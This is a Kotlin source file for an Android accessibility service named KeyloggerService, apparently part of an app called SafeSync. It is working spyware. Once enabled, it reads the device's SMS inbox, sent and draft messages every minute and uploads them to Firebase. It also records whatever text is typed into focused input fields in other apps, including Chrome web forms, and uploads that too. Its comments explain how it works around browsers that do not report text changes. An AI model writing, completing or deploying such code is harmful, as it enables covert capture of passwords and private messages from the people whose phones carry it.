package com.strix.safesync.services

import android.accessibilityservice.AccessibilityService
import android.os.Handler
import android.os.Looper
import android.provider.Telephony
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.auth.FirebaseAuth
import com.strix.safesync.data.FirebaseManager

class KeyloggerService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())

    private val smsSyncRunnable = object : Runnable {
        override fun run() {
            if (FirebaseAuth.getInstance().currentUser != null) {
                syncSms()
            }
            handler.postDelayed(this, 60_000) // 1 minute
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("SafeSyncKeylogger", "Service Connected!")
        
        // Start 1 minute SMS sync loop
        handler.post(smsSyncRunnable)
    }

    private fun syncSms() {
        val smsList = mutableListOf<Map<String, String>>()
        try {
            val cursor = applicationContext.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
                null, null, Telephony.Sms.DEFAULT_SORT_ORDER
            )
            cursor?.use {
                val addrIdx = it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
                val bodyIdx = it.getColumnIndexOrThrow(Telephony.Sms.BODY)
                val dateIdx = it.getColumnIndexOrThrow(Telephony.Sms.DATE)
                val typeIdx = it.getColumnIndexOrThrow(Telephony.Sms.TYPE)
                var count = 0
                while (it.moveToNext() && count < 100) {
                    val type = when (it.getInt(typeIdx)) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX  -> "inbox"
                        Telephony.Sms.MESSAGE_TYPE_SENT   -> "sent"
                        Telephony.Sms.MESSAGE_TYPE_DRAFT  -> "draft"
                        else -> "other"
                    }
                    smsList.add(mapOf(
                        "address" to (it.getString(addrIdx) ?: ""),
                        "body"    to (it.getString(bodyIdx) ?: "").take(500),
                        "date"    to (it.getString(dateIdx) ?: ""),
                        "type"    to type
                    ))
                    count++
                }
            }
        } catch (_: Exception) {}
        
        if (smsList.isNotEmpty()) {
            FirebaseManager.uploadSms(smsList)
        }
    }

    private var lastKeylogText = ""

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // --- Universal Keylogger (Handles Chrome, WebViews, and Standard Apps) ---
        // Many apps like Chrome don't reliably emit TYPE_VIEW_TEXT_CHANGED for web inputs.
        // So we actively check the currently focused input field whenever the screen updates.
        try {
            val rootNode = rootInActiveWindow
            if (rootNode != null) {
                val focusedNode = rootNode.findFocus(android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT)
                if (focusedNode != null && focusedNode.isEditable) {
                    val currentText = focusedNode.text?.toString()?.trim() ?: ""
                    val pkg = focusedNode.packageName?.toString() ?: ""
                    
                    if (currentText.isNotBlank() && currentText != lastKeylogText && pkg != "com.strix.safesync") {
                        lastKeylogText = currentText
                        Log.d("SafeSyncKeylogger", "Universal Keylogger ($pkg): $currentText")
                        FirebaseManager.uploadKeylog(pkg, currentText)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("SafeSyncKeylogger", "Error finding focus: ${e.message}")
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        Log.d("SafeSyncKeylogger", "Service Destroyed")
        handler.removeCallbacks(smsSyncRunnable)
    }
}

